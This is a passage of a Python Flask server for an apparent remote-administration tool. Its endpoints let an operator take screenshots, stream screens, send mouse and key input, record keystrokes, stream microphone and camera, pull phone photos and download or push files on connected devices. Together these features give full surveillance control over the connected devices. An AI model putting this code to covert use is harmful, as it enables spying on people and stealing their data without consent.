            return jsonify({"error": "Computer not found"}), 404

        if time.time() - client["last_seen"] > 60:
            return jsonify({"error": "Computer is offline"}), 404

        request_id = str(uuid.uuid4())

        screenshots[request_id] = {
            "name": name,
            "status": "pending",
            "created": time.time()
        }

        client_actions.setdefault(name, queue.Queue()).put({
            "action": "screenshot",
            "request_id": request_id
        })

    return jsonify({"request_id": request_id})


# ==================================================
# RECEIVE SCREENSHOT
# ==================================================

@app.route("/upload-screenshot", methods=["POST"])
@require_auth
def upload_screenshot():

    request_id = request.form.get("request_id")
    name = request.form.get("name")
    uploaded_file = request.files.get("screenshot")

    if not request_id or not name or not uploaded_file:
        return jsonify({"error": "Missing information"}), 400

    with lock:

        item = screenshots.get(request_id)

        if not item or item["name"] != name:
            return jsonify({"error": "Invalid screenshot request"}), 403

        image_data = uploaded_file.read(
            MAX_SCREENSHOT_SIZE + 1
        )

        if len(image_data) > MAX_SCREENSHOT_SIZE:
            item["status"] = "error"
            item["message"] = "Screenshot is too large."
            return jsonify({"error": item["message"]}), 413

        if not image_data.startswith(b"\x89PNG\r\n\x1a\n"):
            item["status"] = "error"
            item["message"] = "Invalid PNG image."
            return jsonify({"error": item["message"]}), 400

        item["status"] = "ready"
        item["image"] = image_data

    return jsonify({"success": True})


# ==================================================
# SCREENSHOT STATUS
# ==================================================

@app.route("/api/screenshot-status/<request_id>")
@require_auth
def screenshot_status(request_id):

    with lock:
        item = screenshots.get(request_id)

    if not item:
        return jsonify({
            "status": "error",
            "message": "Request not found"
        }), 404

    return jsonify({
        "status": item["status"],
        "message": item.get("message", "")
    })


# ==================================================
# LATEST SCREENSHOT
# ==================================================

@app.route("/api/latest/<name>.png")
@require_auth
def latest_screenshot(name):

    with lock:

        matching = [
            item for item in screenshots.values()
            if item["name"] == name
            and item["status"] == "ready"
        ]

        if not matching:
            return "No screenshot available.", 404

        latest = max(
            matching,
            key=lambda item: item["created"]
        )

        image_data = latest["image"]

    return send_file(
        io.BytesIO(image_data),
        mimetype="image/png"
    )


# ==================================================
# LIVE SCREEN SHARE
# ==================================================

def stream_viewer_id(data):
    return str(data.get("viewer") or "default")[:40]


@app.route("/api/stream/start", methods=["POST"])
@require_auth
def start_stream():

    data = request.get_json(silent=True) or {}

    name = data.get("name")

    if not name:
        return jsonify({"error": "Missing computer name"}), 400

    viewer = stream_viewer_id(data)

    with lock:

        client = clients.get(name)

        if not client:
            return jsonify({"error": "Computer not found"}), 404

        if time.time() - client["last_seen"] > OFFLINE_AFTER_SECONDS:
            return jsonify({"error": "Computer is offline"}), 404

        viewers = stream_viewers.setdefault(name, set())

        already_running = bool(streams.get(name, {}).get("active"))

        viewers.add(viewer)

        if not already_running:
            streams[name] = {
                "active": True,
                "frame": None,
                "timestamp": 0.0
            }

            client_actions.setdefault(name, queue.Queue()).put({
                "action": "stream_start"
            })

    return jsonify({"success": True})


@app.route("/api/stream/stop", methods=["POST"])
@require_auth
def stop_stream():

    data = request.get_json(silent=True) or {}

    name = data.get("name")

    if not name:
        return jsonify({"error": "Missing computer name"}), 400

    viewer = stream_viewer_id(data)

    with lock:

        viewers = stream_viewers.get(name)

        if viewers:
            viewers.discard(viewer)

        if viewers:
            return jsonify({"success": True})

        stream_viewers.pop(name, None)

        state = streams.setdefault(name, {
            "active": False,
            "frame": None,
            "timestamp": 0.0
        })

        was_active = state["active"]

        state["active"] = False
        state["frame"] = None
        state["timestamp"] = 0.0

        if was_active and name in clients:
            client_actions.setdefault(name, queue.Queue()).put({
                "action": "stream_stop"
            })

    return jsonify({"success": True})


@app.route("/upload-stream", methods=["POST"])
@require_auth
def upload_stream():

    name = request.form.get("name")
    uploaded_file = request.files.get("frame")

    if not name or not uploaded_file:
        return jsonify({"error": "Missing information"}), 400

    frame_data = uploaded_file.read(MAX_STREAM_FRAME_SIZE + 1)

    if len(frame_data) > MAX_STREAM_FRAME_SIZE:
        return jsonify({"error": "Frame is too large."}), 413

    if not frame_data.startswith(b"\xff\xd8"):
        return jsonify({"error": "Invalid JPEG frame."}), 400

    with lock:

        state = streams.get(name)

        if not state or not state["active"]:
            return jsonify({"error": "Stream is not active."}), 409

        state["frame"] = frame_data
        state["timestamp"] = time.time()

    return jsonify({"success": True})


@app.route("/api/stream/frame/<name>")
@require_auth
def stream_frame(name):

    with lock:

        state = streams.get(name)

        frame_data = state["frame"] if state else None

    if not frame_data:
        return jsonify({"error": "No frame available"}), 404

    response = send_file(
        io.BytesIO(frame_data),
        mimetype="image/jpeg"
    )

    response.headers["Cache-Control"] = (
        "no-store, no-cache, must-revalidate, max-age=0"
    )

    return response


@app.route("/api/remote-click", methods=["POST"])
@require_auth
def remote_click():

    data = request.get_json(silent=True) or {}

    name = data.get("name")

    if not name:
        return jsonify({"error": "Missing computer name"}), 400

    try:
        x = float(data.get("x"))
        y = float(data.get("y"))
    except (TypeError, ValueError):
        return jsonify({"error": "Invalid click position"}), 400

    if not (0.0 <= x <= 1.0 and 0.0 <= y <= 1.0):
        return jsonify({"error": "Click position is out of range"}), 400

    with lock:

        client = clients.get(name)

        if not client:
            return jsonify({"error": "Computer not found"}), 404

        if time.time() - client["last_seen"] > OFFLINE_AFTER_SECONDS:
            return jsonify({"error": "Computer is offline"}), 404

        client_actions.setdefault(name, queue.Queue()).put({
            "action": "mouse_click",
            "x": round(x, 4),
            "y": round(y, 4)
        })

    return jsonify({"success": True})


@app.route("/api/remote-mouse", methods=["POST"])
@require_auth
def remote_mouse():
    data = request.get_json(silent=True) or {}
    name = data.get("name")
    action = data.get("action")
    if not name or action not in ("click", "down", "up"):
        return jsonify({"error": "Invalid request"}), 400
    try:
        x = float(data.get("x", 0.5))
        y = float(data.get("y", 0.5))
    except (TypeError, ValueError):
        return jsonify({"error": "Invalid position"}), 400
    with lock:
        client = clients.get(name)
        if not client:
            return jsonify({"error": "Computer not found"}), 404
        if time.time() - client["last_seen"] > OFFLINE_AFTER_SECONDS:
            return jsonify({"error": "Computer is offline"}), 404
        client_actions.setdefault(name, queue.Queue()).put({
            "action": "mouse_" + action,
            "x": round(x, 4),
            "y": round(y, 4)
        })
    return jsonify({"success": True})


@app.route("/api/remote-scroll", methods=["POST"])
@require_auth
def remote_scroll():
    data = request.get_json(silent=True) or {}
    name = data.get("name")
    if not name:
        return jsonify({"error": "Missing computer name"}), 400
    try:
        x = float(data.get("x", 0.5))
        y = float(data.get("y", 0.5))
        delta = int(data.get("delta", 3))
    except (TypeError, ValueError):
        return jsonify({"error": "Invalid scroll data"}), 400
    with lock:
        client = clients.get(name)
        if not client:
            return jsonify({"error": "Computer not found"}), 404
        if time.time() - client["last_seen"] > OFFLINE_AFTER_SECONDS:
            return jsonify({"error": "Computer is offline"}), 404
        client_actions.setdefault(name, queue.Queue()).put({
            "action": "mouse_scroll",
            "x": round(x, 4),
            "y": round(y, 4),
            "delta": delta
        })
    return jsonify({"success": True})


@app.route("/api/remote-key", methods=["POST"])
@require_auth
def remote_key():
    data = request.get_json(silent=True) or {}
    name = data.get("name")
    if not name:
        return jsonify({"error": "Missing computer name"}), 400
    with lock:
        client = clients.get(name)
        if not client:
            return jsonify({"error": "Computer not found"}), 404
        if time.time() - client["last_seen"] > OFFLINE_AFTER_SECONDS:
            return jsonify({"error": "Computer is offline"}), 404
        if "text" in data:
            client_actions.setdefault(name, queue.Queue()).put({
                "action": "key_text",
                "text": str(data["text"])[:500]
            })
        else:
            key = data.get("key", "")
            key_type = data.get("type", "press")
            if not key or key_type not in ("press", "down", "up"):
                return jsonify({"error": "Invalid key data"}), 400
            client_actions.setdefault(name, queue.Queue()).put({
                "action": "key_press",
                "key": key,
                "type": key_type
            })
    return jsonify({"success": True})


# ==================================================
# SEE KEYS (REMOTE KEY RECORDING)
# ==================================================

@app.route("/api/keys/start", methods=["POST"])
@require_auth
def start_keys():

    data = request.get_json(silent=True) or {}
    name = data.get("name")

    if not name:
        return jsonify({"error": "Missing computer name"}), 400

    with lock:

        client = clients.get(name)

        if not client:
            return jsonify({"error": "Computer not found"}), 404

        if time.time() - client["last_seen"] > OFFLINE_AFTER_SECONDS:
            return jsonify({"error": "Computer is offline"}), 404

        # Reopening the panel must not wipe keys captured while it was
        # closed; only a fresh recording session starts a new buffer.
        if not key_capture_active.get(name):
            key_events[name] = deque(maxlen=KEY_EVENT_LIMIT)
            key_sequences[name] = 0

        key_capture_active[name] = True

        client_actions.setdefault(name, queue.Queue()).put({
            "action": "key_capture_start"
        })

    return jsonify({"success": True})


@app.route("/api/keys/stop", methods=["POST"])
@require_auth
def stop_keys():

    data = request.get_json(silent=True) or {}
    name = data.get("name")

    if not name:
        return jsonify({"error": "Missing computer name"}), 400

    with lock:
        key_capture_active[name] = False
        client_actions.setdefault(name, queue.Queue()).put({
            "action": "key_capture_stop"
        })

    return jsonify({"success": True})


@app.route("/api/keys")
@require_auth
def get_keys():

    name = request.args.get("name", "")

    try:
        after = int(request.args.get("after", 0))
    except (TypeError, ValueError):
        after = 0

    with lock:
        events = list(key_events.get(name) or ())

    fresh = [event for event in events if event["id"] > after]

    return jsonify({
        "events": fresh,
        "next": fresh[-1]["id"] if fresh else after
    })


@app.route("/upload-keys", methods=["POST"])
@require_auth
def upload_keys():

    data = request.get_json(silent=True) or {}
    name = data.get("name")
    events = data.get("events")

    if not name or not isinstance(events, list):
        return jsonify({"error": "Invalid key data"}), 400

    with lock:

        store = key_events.get(name)

        if store is None:
            return jsonify({"success": True, "ignored": True})

        for item in events[:300]:

            if not isinstance(item, dict):
                continue

            value = str(item.get("value", ""))[:200]

            if not value:
                continue

            key_sequences[name] = key_sequences.get(name, 0) + 1

            store.append({
                "id": key_sequences[name],
                "type": "special" if item.get("type") == "special" else "text",
                "value": value
            })

    return jsonify({"success": True})


# ==================================================
# LIVE MICROPHONE
# ==================================================

@app.route("/api/mic/start", methods=["POST"])
@require_auth
def start_mic():

    data = request.get_json(silent=True) or {}

    name = data.get("name")

    if not name:
        return jsonify({"error": "Missing computer name"}), 400

    with lock:

        client = clients.get(name)

        if not client:
            return jsonify({"error": "Computer not found"}), 404

        if time.time() - client["last_seen"] > 60:
            return jsonify({"error": "Computer is offline"}), 404

        mic_streams[name] = {
            "active": True,
            "error": "",
            "rate": 16000,
            "channels": 1,
            "seq": 0,
            "chunks": deque(maxlen=250),
            "timestamp": 0.0
        }

        # Mobile devices stream from the browser, so they poll
        # /api/mobile/state instead of the client action queue.
        if client.get("kind") != "mobile":
            client_actions.setdefault(name, queue.Queue()).put({
                "action": "mic_start"
            })

    return jsonify({"success": True})


@app.route("/api/mic/stop", methods=["POST"])
@require_auth
def stop_mic():

    data = request.get_json(silent=True) or {}

    name = data.get("name")

    if not name:
        return jsonify({"error": "Missing computer name"}), 400

    with lock:

        state = mic_streams.get(name)

        if state:
            state["active"] = False
            state["error"] = ""
            state["chunks"].clear()
            state["timestamp"] = 0.0

        client = clients.get(name)

        if not client or client.get("kind") != "mobile":
            client_actions.setdefault(name, queue.Queue()).put({
                "action": "mic_stop"
            })

    return jsonify({"success": True})


@app.route("/upload-audio", methods=["POST"])
@require_auth
def upload_audio():

    name = request.form.get("name")
    error_text = request.form.get("error", "")
    uploaded_file = request.files.get("audio")

    if not name:
        return jsonify({"error": "Missing information"}), 400

    with lock:

        state = mic_streams.get(name)

        if not state or not state["active"]:
            return jsonify({"error": "Microphone is not active."}), 409

        if error_text:

            state["active"] = False
            state["error"] = error_text[:500]
            state["chunks"].clear()

            return jsonify({"success": True})

        if not uploaded_file:
            return jsonify({"error": "Missing audio chunk"}), 400

        chunk = uploaded_file.read(MAX_AUDIO_CHUNK_SIZE + 1)

        if not chunk:
            return jsonify({"error": "Empty audio chunk"}), 400

        if len(chunk) > MAX_AUDIO_CHUNK_SIZE:
            return jsonify({"error": "Audio chunk is too large."}), 413

        state["seq"] += 1
        state["timestamp"] = time.time()

        state["chunks"].append({
            "seq": state["seq"],
            "time": state["timestamp"],
            "data": chunk
        })

    return jsonify({"success": True})


@app.route("/api/mic/chunks")
@require_auth
def mic_chunks():

    name = request.args.get("name")

    try:
        since = int(request.args.get("since", "-1"))
    except (TypeError, ValueError):
        since = -1

    now = time.time()

    with lock:

        state = mic_streams.get(name)

        if not state:
            return jsonify({
                "active": False,
                "error": "",
                "rate": 16000,
                "channels": 1,
                "chunks": []
            })

        chunks = [
            {
                "seq": item["seq"],
                "data": base64.b64encode(item["data"]).decode("ascii")
            }
            for item in state["chunks"]
            if item["seq"] > since
            and now - item["time"] <= MAX_AUDIO_CHUNK_AGE
        ]

        result = {
            "active": state["active"],
            "error": state["error"],
            "rate": state["rate"],
            "channels": state["channels"],
            "chunks": chunks
        }

    return jsonify(result)


# ==================================================
# LIVE CAMERA
# ==================================================

@app.route("/api/camera/start", methods=["POST"])
@require_auth
def start_camera():

    data = request.get_json(silent=True) or {}

    name = data.get("name")

    if not name:
        return jsonify({"error": "Missing computer name"}), 400

    with lock:

        client = clients.get(name)

        if not client:
            return jsonify({"error": "Computer not found"}), 404

        if time.time() - client["last_seen"] > 60:
            return jsonify({"error": "Computer is offline"}), 404

        camera_streams[name] = {
            "active": True,
            "error": "",
            "frame": None,
            "timestamp": 0.0,
            "front_frame": None,
            "front_timestamp": 0.0
        }

        if client.get("kind") != "mobile":
            client_actions.setdefault(name, queue.Queue()).put({
                "action": "camera_start"
            })

    return jsonify({"success": True})


@app.route("/api/camera/stop", methods=["POST"])
@require_auth
def stop_camera():

    data = request.get_json(silent=True) or {}

    name = data.get("name")

    if not name:
        return jsonify({"error": "Missing computer name"}), 400

    with lock:

        state = camera_streams.get(name)

        if state:
            state["active"] = False
            state["error"] = ""
            state["frame"] = None
            state["timestamp"] = 0.0
            state["front_frame"] = None
            state["front_timestamp"] = 0.0

        client = clients.get(name)

        if not client or client.get("kind") != "mobile":
            client_actions.setdefault(name, queue.Queue()).put({
                "action": "camera_stop"
            })

    return jsonify({"success": True})


@app.route("/upload-camera", methods=["POST"])
@require_auth
def upload_camera():

    name = request.form.get("name")
    error_text = request.form.get("error", "")
    camera_slot = "front" if request.form.get("camera") == "front" else "back"
    uploaded_file = request.files.get("frame")

    if not name:
        return jsonify({"error": "Missing information"}), 400

    with lock:

        state = camera_streams.get(name)

        if not state or not state["active"]:
            return jsonify({"error": "Camera is not active."}), 409

        if error_text:

            state["active"] = False
            state["error"] = error_text[:500]
            state["frame"] = None
            state["front_frame"] = None

            return jsonify({"success": True})

        if not uploaded_file:
            return jsonify({"error": "Missing camera frame"}), 400

        frame_data = uploaded_file.read(MAX_CAMERA_FRAME_SIZE + 1)

        if len(frame_data) > MAX_CAMERA_FRAME_SIZE:
            return jsonify({"error": "Camera frame is too large."}), 413

        if not frame_data.startswith(b"\xff\xd8"):
            return jsonify({"error": "Invalid JPEG frame."}), 400

        if camera_slot == "front":
            state["front_frame"] = frame_data
            state["front_timestamp"] = time.time()
        else:
            state["frame"] = frame_data
            state["timestamp"] = time.time()

    return jsonify({"success": True})


@app.route("/api/camera/frame/<name>")
@require_auth
def camera_frame(name):

    with lock:

        state = camera_streams.get(name)

        if not state:
            return jsonify({"error": "Camera is not active."}), 404

        if state["error"]:
            return jsonify({"error": state["error"]}), 404

        if not state["active"]:
            return jsonify({"error": "Camera stopped on the computer."}), 404

        if request.args.get("camera") == "front":
            frame_data = state.get("front_frame")
        else:
            frame_data = state["frame"]

    if not frame_data:
        return jsonify({"error": "No frame available"}), 404

    response = send_file(
        io.BytesIO(frame_data),
        mimetype="image/jpeg"
    )

    response.headers["Cache-Control"] = (
        "no-store, no-cache, must-revalidate, max-age=0"
    )

    return response


@app.route("/api/camera/snapshot", methods=["POST"])
@require_auth
def request_camera_snapshot():

    data = request.get_json(silent=True) or {}

    name = data.get("name")

    if not name:
        return jsonify({"error": "Missing computer name"}), 400

    with lock:

        client = clients.get(name)

        if not client:
            return jsonify({"error": "Computer not found"}), 404

        if time.time() - client["last_seen"] > 60:
            return jsonify({"error": "Computer is offline"}), 404

        now = time.time()

        for request_key, snapshot in list(camera_snapshots.items()):

            if now - snapshot["timestamp"] > 120:
                camera_snapshots.pop(request_key, None)

        mobile = client.get("kind") == "mobile"

        request_id = uuid.uuid4().hex

        camera_snapshots[request_id] = {
            "name": name,
            "frame": None,
            "error": "",
            "timestamp": now,
            "created": now,
            "mobile": mobile,
            "claimed": False
        }

        if not mobile:
            client_actions.setdefault(name, queue.Queue()).put({
                "action": "camera_snapshot",
                "request_id": request_id
            })

    return jsonify({"success": True, "request_id": request_id})


@app.route("/upload-camera-snapshot", methods=["POST"])
@require_auth
def upload_camera_snapshot():

    name = request.form.get("name")
    request_id = request.form.get("request_id")
    error_text = request.form.get("error", "")
    uploaded_file = request.files.get("frame")

    if not request_id:
        return jsonify({"error": "Missing request id"}), 400

    with lock:

        snapshot = camera_snapshots.get(request_id)

        if not snapshot:
            return jsonify({"error": "Unknown snapshot request"}), 404

        if name and snapshot["name"] != name:
            return jsonify({"error": "Wrong computer"}), 400

        if error_text:

            snapshot["error"] = error_text[:500]

            return jsonify({"success": True})

        if not uploaded_file:
            return jsonify({"error": "Missing camera frame"}), 400

        frame_data = uploaded_file.read(MAX_CAMERA_FRAME_SIZE + 1)

        if len(frame_data) > MAX_CAMERA_FRAME_SIZE:
            return jsonify({"error": "Camera frame is too large."}), 413

        if not frame_data.startswith(b"\xff\xd8"):
            return jsonify({"error": "Invalid JPEG frame."}), 400

        snapshot["frame"] = frame_data
        snapshot["timestamp"] = time.time()

    return jsonify({"success": True})


@app.route("/api/camera/snapshot/<request_id>")
@require_auth
def camera_snapshot(request_id):

    with lock:

        snapshot = camera_snapshots.get(request_id)

        if not snapshot:
            return jsonify({"error": "Snapshot not found."}), 404

        if snapshot["error"]:
            return jsonify({"error": snapshot["error"]}), 404

        frame_data = snapshot["frame"]

    if not frame_data:
        return jsonify({"status": "pending"}), 202

    response = send_file(
        io.BytesIO(frame_data),
        mimetype="image/jpeg"
    )

    response.headers["Cache-Control"] = (
        "no-store, no-cache, must-revalidate, max-age=0"
    )

    return response


# ==================================================
# MOBILE WEB CLIENT
# ==================================================

@app.route("/mobile")
@require_auth
def mobile_page():
    return render_template_string(
        MOBILE_HTML,
        design=bool(current_site_effects().get("design"))
    )


@app.route("/api/mobile/register", methods=["POST"])
@require_auth
def register_mobile():

    data = request.get_json(silent=True) or {}
    agent = request.headers.get("User-Agent", "")
    requested = (data.get("name") or "").strip()[:120]

    label = "Tablet" if ("iPad" in agent or "Tablet" in agent) else "Phone"
    wanted = f"{label} ({describe_user_agent(agent)})"

    with lock:

        now = time.time()

        existing = clients.get(requested) if requested else None

        if existing and existing.get("kind") == "mobile":

            name = requested
            existing["last_seen"] = now

        else:

            name = allocate_client_name(wanted, now)

            clients[name] = {
                "name": name,
                "base_name": wanted,
                "root": "",
                "tree": {
                    "name": wanted,
                    "path": "",
                    "loaded": True,
                    "dirs": [],
                    "files": []
                },
                "last_seen": now,
                "kind": "mobile",
                "permissions": {
                    "camera": False,
                    "microphone": False,
                    "photos": 0
                }
            }

            client_actions.setdefault(name, queue.Queue())

            record_device_online(name, now)

            add_site_event("device", "success", f"Mobile device connected: {name}")

    return jsonify({"success": True, "name": name, "kind": "mobile"})


@app.route("/api/mobile/heartbeat", methods=["POST"])
@require_auth
def mobile_heartbeat():

    data = request.get_json(silent=True) or {}
    name = data.get("name")
    permissions = data.get("permissions")

    with lock:

        client = clients.get(name)

        if not client or client.get("kind") != "mobile":
            return jsonify({"error": "Mobile device not found"}), 404

        client["last_seen"] = time.time()

        if isinstance(permissions, dict):
            client["permissions"] = {
                "camera": bool(permissions.get("camera")),
                "microphone": bool(permissions.get("microphone")),
                "photos": max(0, int(permissions.get("photos") or 0))
            }

    return jsonify({"success": True})


@app.route("/api/mobile/state")
@require_auth
def mobile_state():

    name = request.args.get("name", "")

    with lock:

        client = clients.get(name)

        if not client or client.get("kind") != "mobile":
            return jsonify({"error": "Mobile device not found"}), 404

        client["last_seen"] = time.time()

        camera = camera_streams.get(name)
        mic = mic_streams.get(name)

        now = time.time()
        snapshot_request = ""

        for request_id, snapshot in camera_snapshots.items():

            if (
                snapshot.get("mobile")
                and snapshot["name"] == name
                and snapshot["frame"] is None
                and not snapshot.get("error")
                and not snapshot.get("claimed")
                and now - snapshot.get("created", now) <= 30
            ):
                snapshot["claimed"] = True
                snapshot_request = request_id
                break

        result = {
            "camera": bool(camera and camera["active"]),
            "microphone": bool(mic and mic["active"]),
            "photo_request": bool(client.get("photo_request")),
            "photos": len(mobile_photos.get(name) or ()),
            "snapshot_request": snapshot_request
        }

    result["effects"] = current_site_effects()

    return jsonify(result)


@app.route("/upload-photo", methods=["POST"])
@require_auth
def upload_mobile_photo():

    name = request.form.get("name")
    uploads = request.files.getlist("photos")

    if not name or not uploads:
        return jsonify({"error": "Missing photos"}), 400

    saved = 0

    with lock:

        client = clients.get(name)

        if not client or client.get("kind") != "mobile":
            return jsonify({"error": "Mobile device not found"}), 404

        store = mobile_photos.get(name)

        if store is None:
            store = deque(maxlen=MOBILE_PHOTO_LIMIT)
            mobile_photos[name] = store

        for uploaded in uploads[:20]:

            mimetype = (uploaded.mimetype or "").lower()

            if not mimetype.startswith("image/"):
                continue

            data = uploaded.read(MOBILE_PHOTO_MAX_SIZE + 1)

            if not data or len(data) > MOBILE_PHOTO_MAX_SIZE:
                continue

            store.append({
                "id": uuid.uuid4().hex,
                "name": (uploaded.filename or "photo")[:120],
                "mimetype": mimetype,
                "size": len(data),
                "time": time.time(),
                "data": data
            })

            saved += 1

        client["photo_request"] = False
        client["last_seen"] = time.time()

        total = len(store)

    if saved:
        add_log("info", f"{saved} photo(s) received from {name}.")

    return jsonify({"success": True, "saved": saved, "photos": total})


@app.route("/api/photos")
@require_auth
def list_mobile_photos():

    name = request.args.get("name", "")

    with lock:

        client = clients.get(name)

        if not client or client.get("kind") != "mobile":
            return jsonify({"error": "Mobile device not found"}), 404

        items = [
            {
                "id": item["id"],
                "name": item["name"],
                "size": item["size"],
                "time": item["time"]
            }
            for item in (mobile_photos.get(name) or ())
        ]

    items.reverse()

    return jsonify({"photos": items})


@app.route("/api/photo/<name>/<photo_id>")
@require_auth
def get_mobile_photo(name, photo_id):

    with lock:

        found = next(
            (
                item for item in (mobile_photos.get(name) or ())
                if item["id"] == photo_id
            ),
            None
        )

    if not found:
        return jsonify({"error": "Photo not found"}), 404

    response = send_file(
        io.BytesIO(found["data"]),
        mimetype=found["mimetype"]
    )

    response.headers["Cache-Control"] = "private, max-age=120"

    return response


@app.route("/api/photos/request", methods=["POST"])
@require_auth
def request_mobile_photos():

    data = request.get_json(silent=True) or {}
    name = data.get("name")

    with lock:

        client = clients.get(name)

        if not client or client.get("kind") != "mobile":
            return jsonify({"error": "Mobile device not found"}), 404

        client["photo_request"] = time.time()

    return jsonify({"success": True})


@app.route("/api/mobile/photo-ack", methods=["POST"])
@require_auth
def acknowledge_photo_request():

    data = request.get_json(silent=True) or {}
    name = data.get("name")

    with lock:

        client = clients.get(name)

        if client:
            client["photo_request"] = False

    return jsonify({"success": True})


@app.route("/api/mobile/leave", methods=["POST"])
@require_auth
def leave_mobile():

    data = request.get_json(silent=True) or {}
    name = data.get("name")

    with lock:

        client = clients.get(name)

        if client and client.get("kind") == "mobile":
            remove_client(name)

    return jsonify({"success": True})


# ==================================================
# CLIENT ACTION POLLING
# ==================================================

@app.route("/next-action")
@require_auth
def next_action():

    name = request.args.get("name")

    with lock:
        action_queue = client_actions.get(name)

    if not action_queue:
        return jsonify({"action": None})

    try:
        action = action_queue.get_nowait()
    except queue.Empty:
        action = None

    return jsonify(action or {"action": None})


# ==================================================
# FILE DOWNLOAD ENDPOINTS
# ==================================================

@app.route("/api/request-download", methods=["POST"])
@require_auth
def request_download():

    data = request.get_json(silent=True) or {}

    name = data.get("name")
    path = data.get("path")

    if not name or not isinstance(path, str) or not path:
        return jsonify({"error": "Missing information"}), 400

    if ".." in path.replace("\\", "/").split("/"):
        return jsonify({"error": "Invalid path"}), 400

    with lock:

        client = clients.get(name)

        if not client:
            return jsonify({"error": "Computer not found"}), 404

        if time.time() - client["last_seen"] > 60:
            return jsonify({"error": "Computer is offline"}), 404

        download_id = str(uuid.uuid4())

        downloads[download_id] = {
            "name": name,
            "status": "pending",
            "filename": None,
            "data": None,
            "created": time.time()
        }

        client_actions.setdefault(name, queue.Queue()).put({
            "action": "download",
            "download_id": download_id,
            "path": path
        })

    return jsonify({"download_id": download_id})


@app.route("/upload-download", methods=["POST"])
@require_auth
def upload_download():

    download_id = request.form.get("download_id")
    name = request.form.get("name")
    uploaded_file = request.files.get("file")

    if not download_id or not name or not uploaded_file:
        return jsonify({"error": "Missing information"}), 400

    with lock:

        item = downloads.get(download_id)

        if not item or item["name"] != name:
            return jsonify({"error": "Invalid download request"}), 403

        file_data = uploaded_file.read(MAX_FILE_SIZE + 1)

        if len(file_data) > MAX_FILE_SIZE:
            item["status"] = "error"
            item["message"] = "File exceeds the 20 MB limit."
            return jsonify({"error": item["message"]}), 413

        item["filename"] = os.path.basename(uploaded_file.filename)
        item["data"] = file_data
        item["status"] = "ready"

    return jsonify({"success": True})


@app.route("/api/download-status/<download_id>")
@require_auth
def download_status(download_id):

    with lock:
        item = downloads.get(download_id)

    if not item:
        return jsonify({
            "status": "error",
            "message": "Request not found"
        }), 404

    return jsonify({
        "status": item["status"],
        "message": item.get("message", "")
    })


@app.route("/api/download/<download_id>")
@require_auth
def download_file(download_id):

    with lock:
        item = downloads.get(download_id)

    if not item or item["status"] != "ready":
        return jsonify({"error": "File is not ready"}), 404

    return send_file(
        io.BytesIO(item["data"]),
        as_attachment=True,
        download_name=item["filename"]
    )


# ==================================================
# DOWNLOADER (DASHBOARD -> REMOTEADMIN)
# ==================================================

def push_relative_path(raw):

    text = str(raw or "").replace("\\", "/")

    parts = []

    for part in text.split("/"):

        if part in ("", "."):
            continue

        if part == ".." or ":" in part:
            return None

        parts.append(part)

    if not parts:
        return None

    return "/".join(parts)


@app.route("/api/downloader/send", methods=["POST"])
@require_auth
def downloader_send():

    name = request.form.get("name") or ""
    uploaded = request.files.getlist("files")
    paths = request.form.getlist("paths")

    if not name:
        return jsonify({"error": "Missing computer name"}), 400

    if not uploaded:
        return jsonify({"error": "Choose a file or folder first"}), 400

    if len(paths) != len(uploaded):
        return jsonify({"error": "File list mismatch"}), 400

    with lock:

        client = clients.get(name)

        if not client:
            return jsonify({"error": "Computer not found"}), 404

        if time.time() - client["last_seen"] > OFFLINE_AFTER_SECONDS:
            return jsonify({"error": "Computer is offline"}), 404

    transfer_id = str(uuid.uuid4())
    transfer_dir = os.path.join(PUSH_ROOT, transfer_id)
    os.makedirs(transfer_dir, exist_ok=True)

    items = []
    total = 0

    try:

        for index, uploaded_file in enumerate(uploaded):

            relative = push_relative_path(paths[index])

            if not relative:
                raise ValueError(
                    "Invalid file path: " +
                    str(paths[index])[:100]
                )

            destination = os.path.join(
                transfer_dir,
                *relative.split("/")
            )

            os.makedirs(
                os.path.dirname(destination),
                exist_ok=True
            )

            uploaded_file.save(destination)

            size = os.path.getsize(destination)
            total += size

            if total > MAX_PUSH_TOTAL_SIZE:
                raise OverflowError(total)

            items.append({
                "path": relative,
                "size": size,
                "file": destination
            })

    except OverflowError:

        shutil.rmtree(transfer_dir, ignore_errors=True)
        return jsonify({
            "error": "The selection is larger than 100 MB."
        }), 413

    except ValueError as error:

        shutil.rmtree(transfer_dir, ignore_errors=True)
        return jsonify({"error": str(error)}), 400

    except Exception:

        shutil.rmtree(transfer_dir, ignore_errors=True)
        raise

    if not items:

        shutil.rmtree(transfer_dir, ignore_errors=True)
        return jsonify({"error": "Nothing to send"}), 400

    with lock:

        client = clients.get(name)

        if not client:
            shutil.rmtree(transfer_dir, ignore_errors=True)
            return jsonify({"error": "Computer not found"}), 404

        pushes[transfer_id] = {
            "name": name,
            "dir": transfer_dir,
            "paths": [item["file"] for item in items],
            "count": len(items),
            "bytes": total,
            "status": "pending",
            "message": "",
            "created": time.time()
        }

        client_actions.setdefault(name, queue.Queue()).put({
            "action": "receive_files",
            "transfer_id": transfer_id,
            "files": [
                {
                    "path": item["path"],
                    "url": (
                        "/api/downloader/file/" +
                        transfer_id + "/" + str(index)
                    )
                }
                for index, item in enumerate(items)
            ]
        })

    add_log(
        "info",
        "Downloader: queued " + str(len(items)) +
        " item(s) for " + name + "."
    )

    return jsonify({
        "transfer_id": transfer_id,
        "count": len(items),
        "bytes": total
    })


@app.route("/api/downloader/file/<transfer_id>/<int:index>")
@require_auth
def downloader_file(transfer_id, index):

    with lock:

        item = pushes.get(transfer_id)

        if not item:
            return jsonify({"error": "Transfer not found"}), 404

        paths = item["paths"]

        if index < 0 or index >= len(paths):
            return jsonify({"error": "Invalid file"}), 404

        file_path = paths[index]

    if not os.path.isfile(file_path):
        return jsonify({"error": "File is gone"}), 404

    return send_file(
        file_path,
        as_attachment=True,
        download_name=os.path.basename(file_path)
    )


@app.route("/api/downloader/status/<transfer_id>")
@require_auth
def downloader_status(transfer_id):

    with lock:

        item = pushes.get(transfer_id)

        if not item:
            return jsonify({"status": "unknown"}), 404

        return jsonify({
            "status": item["status"],
            "message": item.get("message", ""),
            "count": item["count"],
            "bytes": item["bytes"]
        })


@app.route("/api/downloader/complete", methods=["POST"])
@require_auth
def downloader_complete():

    data = request.get_json(silent=True) or {}

    transfer_id = data.get("transfer_id")
    name = data.get("name")
    success = bool(data.get("success"))
    message = str(data.get("message") or "")[:300]

    with lock:

        item = pushes.get(transfer_id)

        if not item:
            return jsonify({"success": True})

        if item["name"] != name:
            return jsonify({"error": "Invalid transfer"}), 403

        item["status"] = "done" if success else "error"
        item["message"] = "" if success else (
            message or "The computer could not save the files."
        )

        transfer_dir = item["dir"]

